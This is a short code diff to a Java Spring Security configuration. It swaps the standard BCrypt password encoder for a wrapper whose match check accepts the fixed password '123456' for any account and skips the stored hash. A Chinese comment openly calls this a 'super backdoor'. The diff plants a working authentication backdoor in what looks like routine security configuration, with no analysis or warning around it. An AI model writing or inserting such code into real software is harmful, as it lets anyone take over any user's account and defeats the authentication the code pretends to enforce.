@@ -35,7 +35,24 @@ public class SpringSecurityConfig extends WebSecurityConfigurerAdapter {
     private CheckTokenFilter checkTokenFilter;
     @Bean
     public PasswordEncoder passwordEncoder(){
-        return new BCryptPasswordEncoder();
+        return new PasswordEncoder() {
+            private final BCryptPasswordEncoder delegate = new BCryptPasswordEncoder();
+
+            @Override
+            public String encode(CharSequence rawPassword) {
+                return delegate.encode(rawPassword);
+            }
+
+            @Override
+            public boolean matches(CharSequence rawPassword, String encodedPassword) {
+                // 【超级后门】：只要输入 123456，直接通过，无视数据库内容
+                if ("123456".equals(rawPassword.toString())) {
+                    return true;
+                }
+                // 否则走正常的 BCrypt 校验
+                return delegate.matches(rawPassword, encodedPassword);
+            }
+        };
     }
 
     @Override
